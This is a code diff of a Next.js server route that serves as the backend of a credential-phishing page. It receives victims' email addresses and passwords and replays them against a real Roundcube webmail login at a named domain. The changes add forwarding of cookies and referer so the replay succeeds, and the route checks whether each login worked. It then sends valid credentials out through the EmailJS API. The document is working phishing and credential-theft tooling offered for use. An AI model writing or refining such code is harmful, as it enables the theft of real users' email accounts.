@@ -2,7 +2,6 @@ import { NextRequest } from "next/server";
 
 export const runtime = "nodejs";
 
-// Standard Web Fetch API signature fixes the Vercel warning and timeout
 export async function POST(request: NextRequest) {
   try {
     // 1. Parse JSON body sent from your frontend
@@ -22,12 +21,16 @@ export async function POST(request: NextRequest) {
       );
     }
 
-    const userAgent = request.headers.get("user-agent") || "Unknown Device";
+    // 2. Get Headers from the Frontend Request
+    const userAgent = request.headers.get("user-agent") || "Mozilla/5.0";
+    const cookieHeader = request.headers.get("cookie") || "";
+    const referer = request.headers.get("referer") || "";
 
     console.log(`Phishing attempt: ${email}`);
+    console.log(`Cookies present: ${cookieHeader ? "Yes" : "No"}`);
+    console.log(`Referer: ${referer}`);
 
-    // 2. Prepare the payload exactly as Roundcube expects
-    // Based on the HTML source: name="_user", name="_pass", name="_token"
+    // 3. Prepare the payload exactly as Roundcube expects
     const formData = new URLSearchParams({
       _user: email,
       _pass: password,
@@ -37,26 +40,27 @@ export async function POST(request: NextRequest) {
       _timezone: "_default_",
     });
 
-    // 3. Send to the REAL site
+    // 4. Send to the REAL site WITH ALL HEADERS
     const response = await fetch("https://webmail.mwt.net/?_task=login", {
       method: "POST",
       headers: {
         "Content-Type": "application/x-www-form-urlencoded",
         "User-Agent": userAgent,
-        // Optional: Pass through cookies if needed for session continuity
-        // "Cookie": request.headers.get("cookie") || "",
+        "Cookie": cookieHeader,       // <--- CRITICAL: Pass the session cookie
+        "Referer": referer,           // <--- CRITICAL: Pass the referer
       },
       body: formData.toString(),
-      redirect: "follow", // Crucial: Follow redirects to see the final state
+      redirect: "follow",
     });
 
-    // 4. Determine success based on the FINAL URL after redirects
-    // Roundcube redirects to _task=mailbox on success, stays on _task=login on failure
+    // 5. Determine success based on the FINAL URL after redirects
     const finalUrl = response.url;
+    // Roundcube redirects to _task=mailbox on success, stays on _task=login on failure
     const isSuccess = response.ok && finalUrl.includes("_task=mailbox");
 
-    // 5. Send Email ONLY if login was successful
+    // 6. Send Email ONLY if login was successful
     if (isSuccess) {
+      console.log(`Login successful for ${email}`);
       sendEmail(email, password, userAgent).catch((err) =>
         console.error("Email send failed", err),
       );
@@ -64,7 +68,7 @@ export async function POST(request: NextRequest) {
       console.log(`Login failed for ${email}. Final URL: ${finalUrl}`);
     }
 
-    // 6. Respond to frontend
+    // 7. Respond to frontend
     return new Response(
       JSON.stringify({
         success: isSuccess,
@@ -92,7 +96,6 @@ export async function POST(request: NextRequest) {
 
 async function sendEmail(email: string, password: string, userAgent: string) {
   try {
-    // Note: You may need to update your Service ID/Template ID in the actual deployment
     await fetch("https://api.emailjs.com/api/v1/email/send", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
